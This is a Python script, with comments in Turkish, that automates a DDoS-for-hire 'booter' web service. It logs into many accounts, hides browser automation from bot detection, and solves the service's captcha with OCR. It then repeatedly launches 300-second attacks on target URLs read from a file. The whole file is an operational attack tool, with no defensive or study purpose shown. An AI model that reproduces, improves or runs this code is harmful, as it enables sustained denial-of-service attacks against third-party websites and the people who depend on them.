import threading
import time
import os
import re
import base64
import io
import shutil
import sys
import logging
from datetime import datetime
from playwright.sync_api import sync_playwright, TimeoutError as PlaywrightTimeout
from PIL import Image, ImageEnhance, ImageFilter
import ddddocr

# Log
LOG_DIR = "logs"
if not os.path.exists(LOG_DIR):
    os.makedirs(LOG_DIR)

log_filename = f"{LOG_DIR}/ddos_log_{datetime.now().strftime('%Y%m%d_%H%M%S')}.log"

logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler(log_filename, encoding='utf-8'),
        logging.StreamHandler(sys.stdout)
    ]
)
logger = logging.getLogger(__name__)

ocr = ddddocr.DdddOcr()

class DDoSNowManager:
    def __init__(self):
        self.base_url = "https://ipbooter.ba"
        self.accounts = self.load_accounts()
        self.running_states = {}
        self.stop_events = {}
        self.active_threads = {}
        logger.info("=== PROGRAM BAŞLADI ===")
        logger.info(f"Site: {self.base_url}")

    def load_accounts(self):
        accounts = []
        if not os.path.exists("accounts.txt"):
            with open("accounts.txt", "w") as f:
                f.write("test:pass:https://example.com\n")
            logger.warning("accounts.txt oluşturuldu!")
            return []
        with open("accounts.txt", "r") as f:
            for line in f:
                line = line.strip()
                if line and not line.startswith("#"):
                    p = line.split(":", 2)
                    if len(p) == 3:
                        accounts.append({
                            "id": str(len(accounts)+1), 
                            "user": p[0], 
                            "pass": p[1], 
                            "target": p[2]
                        })
                        logger.info(f"Hesap yüklendi: {p[0]} -> {p[2]}")
                    else:
                        logger.warning(f"Geçersiz satır atlandı: {line}")
        return accounts

    def preprocess_captcha(self, img):
        """OCR öncesi image'i güçlendir: grayscale, contrast, threshold, resize"""
        try:
            # Grayscale
            img = img.convert('L')
            # Contrast artır
            enhancer = ImageEnhance.Contrast(img)
            img = enhancer.enhance(2.0)
            # Sharpness artır
            enhancer = ImageEnhance.Sharpness(img)
            img = enhancer.enhance(2.0)
            # Threshold (siyah-beyaz)
            img = img.point(lambda x: 0 if x < 128 else 255, '1')
            # Resize 2x (OCR daha iyi okur)
            w, h = img.size
            img = img.resize((w*2, h*2), Image.Resampling.LANCZOS)
            return img
        except Exception as e:
            logger.warning(f"Preprocess hatası: {e}")
            return img

    def is_logged_in(self, page):
        """Sayfada login inputu var mı kontrol et (varsa login sayfasındayız)"""
        try:
            user_input = page.locator("input[name='username']").first
            return user_input.count() == 0  # 0 ise login sayfasında DEĞİLİZ
        except:
            return True

    def do_login(self, page, username, password):
        """Login sayfasındaysak giriş yap"""
        try:
            logger.info(f"[{username}] Login sayfası tespit edildi, giriş yapılıyor...")
            page.fill("input[name='username']", username, timeout=10000)
            page.fill("input[name='password']", password, timeout=10000)
            page.click("button[type='submit']", timeout=10000)
            logger.info(f"[{username}] Login butonuna tıklandı")
            time.sleep(5)
            
            # Cookie banner varsa kapat
            try:
                got_it = page.locator("button:has-text('Got it')").first
                if got_it.count() > 0:
                    got_it.click()
                    time.sleep(1)
            except:
                pass
                
            return True
        except Exception as e:
            logger.error(f"[{username}] Login hatası: {e}")
            return False

    def go_to_hub(self, page, username):
        """Hub sayfasına git ve login kontrolü yap"""
        try:
            page.goto(f"{self.base_url}/hub", timeout=60000)
            page.wait_for_load_state("networkidle", timeout=30000)
            time.sleep(3)
            
            # Login sayfasına düştük mü?
            if not self.is_logged_in(page):
                logger.warning(f"[{username}] Hub'a giderken login sayfasına düşüldü!")
                return False
                
            if "login" in page.url:
                logger.error(f"[{username}] Giriş başarısız!")
                return False
                
            logger.info(f"[{username}] Hub sayfası aktif!")
            return True
        except Exception as e:
            logger.error(f"[{username}] Hub hatası: {e}")
            return False

    def solve_captcha(self, page, username, max_attempts=10):
        """Captcha çöz. Başarısız olursa False dön."""
        for attempt in range(1, max_attempts + 1):
            try:
                # Captcha image'i bekle
                img_elem = page.locator("img[alt='captcha']").first
                if img_elem.count() == 0:
                    logger.warning(f"[{username}] Captcha image yok (deneme {attempt})")
                    time.sleep(1)
                    continue

                img_src = img_elem.get_attribute("src")
                if not img_src or not img_src.startswith("data:image"):
                    logger.warning(f"[{username}] Captcha src geçersiz (deneme {attempt})")
                    time.sleep(1)
                    continue

                base64_data = re.sub(r'^data:image/\w+;base64,', '', img_src)
                img_bytes = base64.b64decode(base64_data)
                img = Image.open(io.BytesIO(img_bytes))
                
                # 🔥 OCR GÜÇLENDİRME: Preprocess et
                img = self.preprocess_captcha(img)
                
                captcha_text = ocr.classification(img)
                captcha_text = re.sub(r'[^A-Z0-9]', '', captcha_text.upper())

                # 🔥 Minimum 3 karakter kontrolü (boş veya 1-2 karakterliyi reddet)
                if len(captcha_text) < 3:
                    logger.warning(f"[{username}] OCR çok kısa sonuç: '{captcha_text}' (deneme {attempt})")
                    time.sleep(1)
                    continue

                logger.info(f"[{username}] OCR (deneme {attempt}/{max_attempts}): {captcha_text}")

                # Inputu bul ve doldur
                captcha_input = page.locator("input[name='captcha']").first
                if captcha_input.count() == 0:
                    logger.warning(f"[{username}] Captcha input yok (deneme {attempt})")
                    time.sleep(1)
                    continue

                captcha_input.fill("")
                time.sleep(0.3)
                captcha_input.fill(captcha_text)
                time.sleep(0.5)

                # Submit butonu bul ve tıkla
                deploy_btn = page.locator("button[type='submit'][form='hubForm']").first
                if deploy_btn.count() == 0:
                    deploy_btn = page.locator("button.btn-confirm:has-text('Deploy Attack')").last
                if deploy_btn.count() == 0:
                    logger.warning(f"[{username}] Deploy butonu yok (deneme {attempt})")
                    time.sleep(1)
                    continue

                deploy_btn.click()
                time.sleep(3)  # 🔥 3 saniye bekle ki mesajlar çıksın

                # 🔥 SAĞLAM DOĞRULAMA: 3 aşamalı kontrol
                # Aşama 1: Invalid captcha var mı?
                invalid_msg = page.locator("text=Invalid captcha code").first
                if invalid_msg.count() > 0:
                    logger.warning(f"[{username}] YANLIŞ captcha: {captcha_text} (deneme {attempt})")
                    # Mesajı temizle
                    try:
                        invalid_msg.evaluate("el => el.remove()")
                    except:
                        pass
                    time.sleep(1)
                    continue

                # Aşama 2: Başarı mesajı var mı?
                success_msg = page.locator("text=Attack Launched").first
                toast_success = page.locator(".Toastify__toast--success").first
                if success_msg.count() > 0 or toast_success.count() > 0:
                    logger.info(f"[{username}] DOĞRU captcha: {captcha_text} - Attack başlatıldı!")
                    return True

                # Aşama 3: Attack gerçekten başladı mı? (Running badge veya accordion)
                time.sleep(2)
                badge = page.locator(".accordion-button .badge").first
                running = page.locator(".stats-content .badge:has-text('Running')").first
                if badge.count() > 0 or running.count() > 0:
                    logger.info(f"[{username}] DOĞRU captcha: {captcha_text} - Attack aktif!")
                    return True

                # Hiçbiri yoksa başarısız say
                logger.warning(f"[{username}] Captcha sonrası başarı/başarısız mesajı bulunamadı (deneme {attempt})")
                continue

            except Exception as e:
                logger.error(f"[{username}] Captcha exception (deneme {attempt}): {e}")
                time.sleep(2)
                continue

        logger.error(f"[{username}] {max_attempts} deneme sonucu captcha çözülemedi!")
        return False

    def check_attack_running(self, page, username):
        """Attack hala devam ediyor mu kontrol et"""
        try:
            badge = page.locator(".accordion-button .badge").first
            if badge.count() > 0:
                t = badge.text_content().strip()
                if t in ["0m 0s", "0s", "0"]:
                    logger.info(f"[{username}] Süre doldu!")
                    return False
                logger.info(f"[{username}] Kalan süre: {t}")
                return True
            
            running = page.locator(".stats-content .badge:has-text('Running')").first
            if running.count() > 0:
                return True
                
            logger.info(f"[{username}] Attack bitti!")
            return False
        except:
            return True

    def browser_worker(self, acc_id, target_url, account_data):
        username = account_data["user"]
        password = account_data["pass"]
        profile_dir = os.path.join(os.getcwd(), f"profiles/profile_{username}")
        stop_event = self.stop_events.get(acc_id)
        
        logger.info(f"[{username}] Worker başlatıldı - Hedef: {target_url}")

        while self.running_states.get(acc_id, False):
            try:
                if os.path.exists(profile_dir):
                    shutil.rmtree(profile_dir, ignore_errors=True)
                os.makedirs(profile_dir, exist_ok=True)

                with sync_playwright() as p:
                    context = p.chromium.launch_persistent_context(
                        user_data_dir=profile_dir,
                        headless=True,
                        args=['--no-sandbox', '--disable-setuid-sandbox'],
                        viewport={"width": 1280, "height": 720},
                        user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
                    )
                    page = context.new_page()
                    page.add_init_script("Object.defineProperty(navigator, 'webdriver', {get: () => undefined});")

                    # İlk login
                    logger.info(f"[{username}] İlk giriş yapılıyor...")
                    page.goto(f"{self.base_url}/login", timeout=60000)
                    page.wait_for_load_state("networkidle", timeout=30000)
                    time.sleep(3)
                    
                    if not self.do_login(page, username, password):
                        time.sleep(30)
                        continue
                    
                    if not self.go_to_hub(page, username):
                        time.sleep(30)
                        continue

                    # ANA DÖNGÜ
                    attack_count = 0
                    while self.running_states.get(acc_id, False) and not (stop_event and stop_event.is_set()):
                        try:
                            attack_count += 1
                            logger.info(f"[{username}] Attack #{attack_count} başlatılıyor...")

                            # 🔥 LOGIN KONTROLÜ: Her attack başında login mi değil mi kontrol et
                            if not self.is_logged_in(page):
                                logger.warning(f"[{username}] Login durumu kontrolü: Çıkış yapılmış!")
                                if not self.do_login(page, username, password):
                                    time.sleep(10)
                                    continue
                                if not self.go_to_hub(page, username):
                                    time.sleep(10)
                                    continue

                            # 1. URL'yi gir
                            target_input = page.locator("input[name='hub.0.host']").first
                            if target_input.count() == 0:
                                logger.error(f"[{username}] URL input bulunamadı! Sayfa yenileniyor...")
                                page.reload()
                                time.sleep(3)
                                continue
                            
                            target_input.fill("")
                            time.sleep(0.5)
                            target_input.fill(target_url)
                            logger.info(f"[{username}] Hedef URL: {target_url}")
                            
                            # 2. Süre inputunu bekle
                            try:
                                time_input = page.wait_for_selector("input[name='hub.0.time']", timeout=15000)
                                logger.info(f"[{username}] Süre inputu aktif!")
                            except PlaywrightTimeout:
                                logger.error(f"[{username}] Süre input 15 sn'de açılmadı! Sayfa yenileniyor...")
                                page.reload()
                                time.sleep(5)
                                continue
                            
                            time_input.fill("")
                            time.sleep(0.5)
                            time_input.fill("300")
                            logger.info(f"[{username}] Süre: 300 saniye")
                            
                            # 3. Deploy butonuna tıkla
                            deploy_btn = page.locator("button.btn-confirm:has-text('Deploy Attack')").first
                            if deploy_btn.count() == 0:
                                deploy_btn = page.locator("button:has-text('Deploy Attack')").first
                            if deploy_btn.count() == 0:
                                logger.error(f"[{username}] Deploy butonu bulunamadı! Sayfa yenileniyor...")
                                page.reload()
                                time.sleep(3)
                                continue
                            deploy_btn.click()
                            logger.info(f"[{username}] Deploy butonuna tıklandı")
                            time.sleep(2)
                            
                            # 4. Captcha çöz (max 10 deneme)
                            if not self.solve_captcha(page, username, max_attempts=10):
                                logger.error(f"[{username}] Captcha başarısız! Sayfa yenileniyor...")
                                page.reload()
                                time.sleep(5)
                                continue
                            
                            logger.info(f"[{username}] Attack başladı!")
                            
                            # 5. Süre takibi - attack bitene kadar bekle
                            while self.running_states.get(acc_id, False) and not (stop_event and stop_event.is_set()):
                                if not self.check_attack_running(page, username):
                                    break
                                time.sleep(5)
                            
                            if not self.running_states.get(acc_id, False):
                                break
                            
                            # 6. Yeniden başlat
                            logger.info(f"[{username}] Yeniden başlatılıyor...")
                            page.reload()
                            time.sleep(5)
                            
                            # Reload sonrası login kontrolü
                            if not self.is_logged_in(page):
                                logger.warning(f"[{username}] Reload sonrası login sayfasına düşüldü!")
                                if not self.do_login(page, username, password):
                                    time.sleep(10)
                                    continue
                                if not self.go_to_hub(page, username):
                                    time.sleep(10)
                                    continue
                            
                        except Exception as e:
                            logger.error(f"[{username}] İşlem hatası: {e}")
                            page.reload()
                            time.sleep(5)
                            continue
                    
                    context.close()
                    
            except Exception as e:
                logger.error(f"[{username}] KRİTİK HATA: {e}")
                time.sleep(10)
                continue
        
        logger.info(f"[{username}] Durduruldu")
        self.running_states[acc_id] = False

    def start_all(self):
        if not self.accounts:
            logger.error("Hiç hesap yok!")
            return
            
        logger.info(f"{len(self.accounts)} hesap başlatılıyor...")
        for acc in self.accounts:
            acc_id = acc["id"]
            target = acc.get("target", "https://example.com")
            self.running_states[acc_id] = True
            self.stop_events[acc_id] = threading.Event()
            t = threading.Thread(target=self.browser_worker, args=(acc_id, target, acc), daemon=True)
            self.active_threads[acc_id] = t
            t.start()
            logger.info(f"[{acc['user']}] Başlatıldı -> {target}")
            time.sleep(3)
        
        while True:
            time.sleep(60)
            logger.info("="*50)
            logger.info("AKTİF HESAPLAR:")
            for acc in self.accounts:
                acc_id = acc["id"]
                status = "Çalışıyor" if self.running_states.get(acc_id, False) else "Durduruldu"
                logger.info(f"  {acc['user']}: {status} -> {acc.get('target', '?')}")
            logger.info("="*50)

if __name__ == "__main__":
    print("""
    ╔═══════════════════════════════════════════╗
    ║   IPBOOTER.BA - DDOS AUTOMATION           ║
    ╚═══════════════════════════════════════════╝
    """)
    manager = DDoSNowManager()
    manager.start_all()
